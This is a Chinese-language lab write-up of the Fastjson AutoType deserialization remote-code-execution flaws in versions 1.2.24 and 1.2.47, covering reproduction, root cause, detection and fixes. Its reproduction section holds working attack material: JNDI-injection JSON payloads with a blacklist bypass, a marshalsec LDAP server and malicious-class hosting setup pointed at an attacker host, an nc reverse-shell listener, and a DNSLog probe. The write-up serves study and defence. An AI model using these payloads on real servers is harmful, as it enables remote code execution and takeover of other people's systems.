
## 目录
1. [漏洞概述](#漏洞概述)
2. [影响版本](#影响版本)
3. [漏洞复现](#漏洞复现)
4. [漏洞原理](#漏洞原理)
5. [漏洞挖掘思路](#漏洞挖掘思路)
6. [修复方案](#修复方案)
7. [法律声明](#法律声明)

---

## 漏洞概述
Fastjson是阿里巴巴开源的高性能JSON处理库，其反序列化机制中存在的AutoType功能可被恶意利用，导致远程代码执行（RCE）。

### 核心漏洞
| **漏洞编号**       | **影响版本**   | **利用方式**                     | **关键类**                   |
|--------------------|----------------|--------------------------------|-----------------------------|
| CNVD-2017-02833    | ≤1.2.24        | JdbcRowSetImpl JNDI注入         | `com.sun.rowset.JdbcRowSetImpl` |
| CNVD-2019-22238    | ≤1.2.47        | 绕过AutoType黑名单              | `java.lang.Class`           |

---

## 影响版本
- **高危版本**：1.2.24、1.2.47  
- **安全版本**：≥1.2.68（需启用`safeMode`）  
- **JDK限制**：  
  - JDK 6u191/7u201/8u191+：禁用远程类加载  
  - JDK 11.0.1+：默认安全配置增强  

---

## 漏洞复现

### 环境搭建
```bash
# 使用vulhub靶场
cd /vulhub/fastjson/1.2.24-rce
docker-compose up -d

# Kali工具准备
python3 -m http.server 8089  # 托管恶意类
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://攻击机IP:8089/#Exploit" 9473
nc -lvp 9001  # 监听反弹Shell
```

### 攻击流程
8. **构造恶意Payload**  
   ```json
   // 1.2.24版本
   {
     "b": {
       "@type": "com.sun.rowset.JdbcRowSetImpl",
       "dataSourceName": "ldap://攻击机IP:9473/Exploit",
       "autoCommit": true
     }
   }

   // 1.2.47版本（绕过黑名单）
   {
     "a": { "@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl" },
     "b": { "@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://攻击机IP:9473/Exploit", "autoCommit": true }
   }
   ```

9. **发送请求**  
   ```http
   POST / HTTP/1.1
   Host: 目标IP:8090
   Content-Type: application/json

   {恶意Payload}
   ```

10. **触发流程**  
   ```mermaid
   graph LR
   A[Fastjson解析@type] --> B[实例化JdbcRowSetImpl]
   B --> C[调用setAutoCommit(true)]
   C --> D[触发JNDI lookup]
   D --> E[加载远程恶意类]
   E --> F[执行系统命令]
   ```

---

## 漏洞原理

### AutoType机制
- **功能**：通过`@type`指定反序列化目标类，支持多态特性。  
- **漏洞点**：未严格校验类名，允许加载危险类（如`JdbcRowSetImpl`）。  

### 利用链分析
11. **JdbcRowSetImpl**  
   - `setDataSourceName()`：设置恶意LDAP/RMI地址  
   - `setAutoCommit()` → `connect()` → `lookup()`：触发JNDI注入  

12. **黑名单绕过（1.2.47）**  
   - 利用`java.lang.Class`缓存类名绕过检测  
   - 二次反序列化加载已被缓存的危险类  

---

## 漏洞挖掘思路

### 检测Fastjson使用
13. **非法格式探测**  
   ```json
   {"x":"  # 返回fastjson特有错误信息
   ```

14. **DNSLog外连**  
   ```json
   {"x":{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}}
   ```

15. **自动化工具**  
   - Burp插件：[fastjsonScan](https://github.com/zilong3033/fastjsonScan)

---

## 修复方案

### 代码层修复
16. **升级Fastjson**  
   ```xml
   <dependency>
     <groupId>com.alibaba</groupId>
     <artifactId>fastjson</artifactId>
     <version>1.2.83</version>
   </dependency>
   ```

17. **启用安全模式**  
   ```java
   ParserConfig.getGlobalInstance().setSafeMode(true);  // 完全禁用AutoType
   ```

### 基础设施加固
- **JDK升级**：≥8u191/11.0.1  
- **WAF规则**：拦截包含`@type`和JNDI协议的请求  

---

## 法律声明
> **《中华人民共和国网络安全法》第二十七条**  
> 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。  
> **本文档内容仅用于安全研究与防御技术学习，严禁用于非法用途！**
```